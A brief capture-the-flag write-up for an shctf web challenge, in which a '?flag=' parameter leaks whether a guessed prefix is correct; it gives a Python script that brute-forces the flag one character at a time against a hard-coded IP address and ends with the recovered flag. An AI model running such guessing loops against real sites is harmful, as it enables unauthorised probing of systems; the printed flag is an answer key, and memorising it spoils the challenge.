Website shows blank cards and challenge description pointed to `?flag=` parameter

![image](https://user-images.githubusercontent.com/44019881/161449766-7e717461-11a4-476e-9f50-8d452a6b41b7.png)


After supplying the flag format some cards are exposed

![image](https://user-images.githubusercontent.com/44019881/161449779-a8d5bda7-a92d-47ef-a967-269c5f0fc195.png)

Bruteforce script

```python
import requests
import string
import re
from time import sleep

URL = 'http://172.105.154.14/?flag='
DICT = string.printable
REGEX = "<div>\n\n(.*\n)\n<\/div>"
FLAG='shctf{'
tempFlag='shctf{'

while True:
    for ch in DICT:
        print(f'\rFLAG={FLAG+str(ch)}',end='')
        r = requests.get(URL+FLAG+str(ch))
        flagre = re.findall(REGEX, r.text)
        tempFlag = ''.join([f.strip() for f in flagre[:-1]])
        if tempFlag == FLAG+str(ch):
            FLAG += str(ch)
            print(f"\rFLAG={FLAG}",end='')
            break
```

![image](https://user-images.githubusercontent.com/44019881/161449792-620fa951-ae7c-40a2-af79-2fcbee7aa431.png)

`shctf{2_explor3_fronti3r}`
